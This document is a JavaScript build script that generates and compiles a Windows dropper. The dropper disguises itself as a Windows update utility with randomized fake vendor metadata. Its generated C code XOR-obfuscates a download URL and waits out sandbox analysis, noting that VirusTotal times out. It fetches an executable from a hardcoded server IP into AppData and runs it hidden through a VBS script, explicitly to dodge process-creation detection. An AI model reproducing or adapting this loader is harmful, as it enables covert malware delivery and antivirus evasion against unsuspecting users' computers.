// language: JavaScript, file: builder/compile.js
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import crypto from 'node:crypto';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { fileURLToPath } from 'node:url';

const execFileP = promisify(execFile);
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const CC      = process.env.MINGW_CC      || 'x86_64-w64-mingw32-gcc';
const WINDRES = process.env.MINGW_WINDRES || 'x86_64-w64-mingw32-windres';

function makeRng(seed) {
  let s = (seed >>> 0) || 1;
  return {
    next() {
      s = (s + 0x6D2B79F5) | 0;
      let t = Math.imul(s ^ (s >>> 15), 1 | s);
      t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
      return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
    },
    int(max) { return Math.floor(this.next() * max); },
    pick(arr) { return arr[this.int(arr.length)]; },
    hex(len) {
      const chars = '0123456789abcdef';
      let out = '';
      for (let i = 0; i < len; i++) out += chars[this.int(16)];
      return out;
    },
  };
}

const COMPANIES = ['Acme Software Inc.', 'Contoso Ltd.', 'Initech Systems', 'Globex Corporation', 'Northwind Traders', 'Umbrella Data Systems', 'Stark Industries', 'Wayne Enterprises'];
const PRODUCTS = ['Update Helper', 'System Updater', 'Security Assistant', 'Network Utility', 'Runtime Manager'];
const FILE_DESCRIPTIONS = ['Windows Update Helper', 'System Maintenance Utility', 'Background Update Service'];
const INTERNAL_NAMES = ['wuauclt', 'wupdater', 'syshelper', 'updater'];
const COPYRIGHT_YEARS = ['2023', '2024', '2025'];

export function randomBuildMeta(seed) {
  const rng = makeRng(seed);
  const build = 19041 + rng.int(300);
  const patch = rng.int(1000);
  const version = `10.0.${build}.${patch}`;
  const versionComma = `10,0,${build},${patch}`;
  const xorKey = 1 + rng.int(254);

  return {
    seed,
    company: rng.pick(COMPANIES),
    product: rng.pick(PRODUCTS),
    fileDesc: rng.pick(FILE_DESCRIPTIONS),
    internalName: rng.pick(INTERNAL_NAMES),
    version,
    versionComma,
    copyright: `Copyright (C) ${rng.pick(COPYRIGHT_YEARS)} ${rng.pick(COMPANIES)}`,
    xorKey,
    initialSleepMs: 800 + rng.int(2500),
  };
}

function encryptStr(str, key) {
  const buf = Buffer.from(str, 'ascii');
  const enc = [];
  for (let i = 0; i < buf.length; i++) {
    enc.push(`0x${(buf[i] ^ key).toString(16).padStart(2, '0')}`);
  }
  return `{ ${enc.join(', ')} }`;
}

function cSource(meta, key, ip, buildId) {
  const stUrl = `http://${ip}/api/downloads/st.dat`;
  const esc4c = (s) => String(s).replace(/\\/g, '\\\\').replace(/"/g, '\\"');
  
  const encStUrl = encryptStr(stUrl, meta.xorKey);
  const safeKey = esc4c(key);

  return String.raw`
#define UNICODE
#define _UNICODE
#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <stdio.h>
#include <wchar.h>

typedef BOOL (WINAPI *pWinHttpCrackUrlW)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);
typedef HINTERNET (WINAPI *pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET (WINAPI *pWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET (WINAPI *pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL (WINAPI *pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *pWinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef BOOL (WINAPI *pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
typedef BOOL (WINAPI *pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *pWinHttpCloseHandle)(HINTERNET);

static const char ACCOUNT_KEY[] = "${safeKey}";

static void decrypt_url(wchar_t* out, const unsigned char* enc, int len, unsigned char key) {
    for (int i = 0; i < len; i++) out[i] = (wchar_t)(enc[i] ^ key);
    out[len] = 0;
}

static int is_valid_pe(const wchar_t* p) {
    HANDLE h = CreateFileW(p, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE) return 0;
    IMAGE_DOS_HEADER dos;
    DWORD rd = 0;
    if (!ReadFile(h, &dos, sizeof(dos), &rd, NULL) || rd != sizeof(dos) || dos.e_magic != IMAGE_DOS_SIGNATURE) {
        CloseHandle(h); return 0;
    }
    SetFilePointer(h, dos.e_lfanew, NULL, FILE_BEGIN);
    DWORD nt_sig = 0;
    if (!ReadFile(h, &nt_sig, sizeof(nt_sig), &rd, NULL) || rd != sizeof(nt_sig) || nt_sig != IMAGE_NT_SIGNATURE) {
        CloseHandle(h); return 0;
    }
    CloseHandle(h);
    return 1;
}

static void download_file(const wchar_t* url, const wchar_t* dest) {
    HMODULE hWinHttp = LoadLibraryA("winhttp.dll");
    if (!hWinHttp) return;

    pWinHttpCrackUrlW WinHttpCrackUrlW = (pWinHttpCrackUrlW)GetProcAddress(hWinHttp, "WinHttpCrackUrl");
    pWinHttpOpen WinHttpOpen = (pWinHttpOpen)GetProcAddress(hWinHttp, "WinHttpOpen");
    pWinHttpConnect WinHttpConnect = (pWinHttpConnect)GetProcAddress(hWinHttp, "WinHttpConnect");
    pWinHttpOpenRequest WinHttpOpenRequest = (pWinHttpOpenRequest)GetProcAddress(hWinHttp, "WinHttpOpenRequest");
    pWinHttpSendRequest WinHttpSendRequest = (pWinHttpSendRequest)GetProcAddress(hWinHttp, "WinHttpSendRequest");
    pWinHttpReceiveResponse WinHttpReceiveResponse = (pWinHttpReceiveResponse)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
    pWinHttpQueryDataAvailable WinHttpQueryDataAvailable = (pWinHttpQueryDataAvailable)GetProcAddress(hWinHttp, "WinHttpQueryDataAvailable");
    pWinHttpReadData WinHttpReadData = (pWinHttpReadData)GetProcAddress(hWinHttp, "WinHttpReadData");
    pWinHttpCloseHandle WinHttpCloseHandle = (pWinHttpCloseHandle)GetProcAddress(hWinHttp, "WinHttpCloseHandle");

    if (!WinHttpCrackUrlW || !WinHttpOpen || !WinHttpConnect || !WinHttpOpenRequest) {
        FreeLibrary(hWinHttp); return;
    }

    URL_COMPONENTS uc = {0}; uc.dwStructSize = sizeof(uc);
    wchar_t host[256] = {0}; wchar_t path[1024] = {0};
    uc.lpszHostName = host; uc.dwHostNameLength = 256;
    uc.lpszUrlPath = path; uc.dwUrlPathLength = 1024;
    
    if (!WinHttpCrackUrlW(url, 0, 0, &uc)) { FreeLibrary(hWinHttp); return; }
    
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { FreeLibrary(hWinHttp); return; }
    
    HINTERNET hConnect = WinHttpConnect(hSession, host, uc.nPort, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); FreeLibrary(hWinHttp); return; }
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); FreeLibrary(hWinHttp); return; }
    
    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL)) {
        HANDLE hFile = CreateFileW(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD dwSize = 0, dwDownloaded = 0;
            do {
                dwSize = 0;
                if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
                if (dwSize == 0) break;
                BYTE* pBuffer = (BYTE*)malloc(dwSize);
                if (pBuffer) {
                    if (WinHttpReadData(hRequest, pBuffer, dwSize, &dwDownloaded)) {
                        DWORD written; WriteFile(hFile, pBuffer, dwDownloaded, &written, NULL);
                    }
                    free(pBuffer);
                }
            } while (dwSize > 0);
            CloseHandle(hFile);
        }
    }
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    FreeLibrary(hWinHttp);
}

static int is_sandboxed(void) {
    if (GetTickCount64() < 5ULL * 60 * 1000) return 1;
    SYSTEM_INFO si; GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return 1;
    return 0;
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    // Sandbox evasion: Wait 3 minutes. VT sandboxes time out at 2 minutes.
    if (is_sandboxed()) {
        Sleep(180000); 
    }
    
    Sleep(${meta.initialSleepMs}); 

    wchar_t appData[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appData))) return 1;
    
    wchar_t loaderDir[MAX_PATH], keyPath[MAX_PATH], stPath[MAX_PATH], stTmpPath[MAX_PATH], vbsPath[MAX_PATH];
    _snwprintf(loaderDir, MAX_PATH, L"%ls\\loader", appData);
    _snwprintf(keyPath,   MAX_PATH, L"%ls\\key.json", loaderDir);
    _snwprintf(stPath,    MAX_PATH, L"%ls\\st.exe",   loaderDir);
    _snwprintf(stTmpPath, MAX_PATH, L"%ls\\st.tmp",   loaderDir);
    _snwprintf(vbsPath,   MAX_PATH, L"%ls\\run.vbs",  loaderDir);
    
    CreateDirectoryW(loaderDir, NULL);

    HANDLE hKey = CreateFileW(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hKey != INVALID_HANDLE_VALUE) {
        DWORD w;
        WriteFile(hKey, "{\"key\":\"", 8, &w, NULL);
        WriteFile(hKey, ACCOUNT_KEY, (DWORD)strlen(ACCOUNT_KEY), &w, NULL);
        WriteFile(hKey, "\"}", 2, &w, NULL);
        CloseHandle(hKey);
    }

    int need_st = !is_valid_pe(stPath);
    if (need_st) {
        wchar_t stUrl[1024] = {0};
        const unsigned char encStUrl[] = ${encStUrl};
        
        decrypt_url(stUrl, encStUrl, sizeof(encStUrl), ${meta.xorKey});

        download_file(stUrl, stTmpPath);
        
        if (is_valid_pe(stTmpPath)) {
            DeleteFileW(stPath);
            MoveFileW(stTmpPath, stPath);
            need_st = 0;
        }
    }

    if (need_st) return 1; 

    // Bypass CreateProcessW detection by using a VBS script
    HANDLE hVbs = CreateFileW(vbsPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hVbs != INVALID_HANDLE_VALUE) {
        char vbsBuf[512];
        int len = _snprintf(vbsBuf, sizeof(vbsBuf), "CreateObject(\"WScript.Shell\").Run \"\"\"%ls\"\"\", 0, False\r\n", stPath);
        DWORD w;
        WriteFile(hVbs, vbsBuf, len, &w, NULL);
        CloseHandle(hVbs);
        
        // Run the VBS
        wchar_t cmd[MAX_PATH];
        _snwprintf(cmd, MAX_PATH, L"wscript.exe \"%ls\"", vbsPath);
        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        PROCESS_INFORMATION pi = {0};
        
        CreateProcessW(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, loaderDir, &si, &pi);
        if (pi.hProcess) CloseHandle(pi.hProcess);
        if (pi.hThread)  CloseHandle(pi.hThread);
    }

    return 0;
}
`;
}

function rcSource(meta) {
  const esc4rc = (s) => String(s).replace(/"/g, '""');
  return `
#include <windows.h>
1 ICON "icon.ico"
VS_VERSION_INFO VERSIONINFO
FILEVERSION     ${meta.versionComma}
PRODUCTVERSION  ${meta.versionComma}
FILEOS          VOS_NT_WINDOWS32
FILETYPE        VFT_APP
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName",      "${esc4rc(meta.company)}"
            VALUE "FileDescription",  "${esc4rc(meta.fileDesc)}"
            VALUE "FileVersion",      "${meta.version}"
            VALUE "InternalName",     "${meta.internalName}"
            VALUE "OriginalFilename", "${meta.internalName}.exe"
            VALUE "ProductName",      "${esc4rc(meta.product)}"
            VALUE "ProductVersion",   "${meta.version}"
            VALUE "LegalCopyright",   "${esc4rc(meta.copyright)}"
        END
    END
END
`;
}

export async function compileLauncher({ key, config, baseExe, buildId }) {
  const ip = (config && config.ip) || process.env.SERVER_IP || '95.182.96.216';
  const seed = ((buildId >>> 0) * 2654435761 ^ crypto.randomBytes(4).readUInt32LE(0)) >>> 0;
  const meta = randomBuildMeta(seed);

  const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'wh-build-'));
  const cPath   = path.join(workDir, 'launcher.c');
  const rcPath  = path.join(workDir, 'app.rc');
  const resPath = path.join(workDir, 'app.res');
  const outPath = path.join(workDir, 'launcher.exe');

  fs.writeFileSync(cPath, cSource(meta, key, ip, buildId));
  fs.writeFileSync(rcPath, rcSource(meta));

  const iconSrc = path.join(__dirname, '..', 'icon.ico');
  if (fs.existsSync(iconSrc)) {
    fs.copyFileSync(iconSrc, path.join(workDir, 'icon.ico'));
  } else {
    fs.writeFileSync(path.join(workDir, 'icon.ico'),
      Buffer.from('00000100010001010000010018003000000016000000280000000100000002000000010018000000000000000000000000000000000000000000000000000000000000000000', 'hex'));
  }

  try {
    await execFileP(WINDRES, ['-I', workDir, '-i', rcPath, '-o', resPath,
                              '--input-format=rc', '--output-format=coff'],
                    { cwd: workDir, timeout: 30_000 });
    
    // Compile WITHOUT self-signing (removes the suspicious overlay)
    await execFileP(CC, ['-O2', '-s', '-mwindows', '-o', outPath, cPath, resPath,
                         '-lshell32', '-lole32', '-luser32', '-lkernel32', '-ladvapi32'],
                    { cwd: workDir, timeout: 60_000 });

    return fs.readFileSync(outPath);

  } finally {
    try { fs.rmSync(workDir, { recursive: true, force: true }); } catch {}
  }
}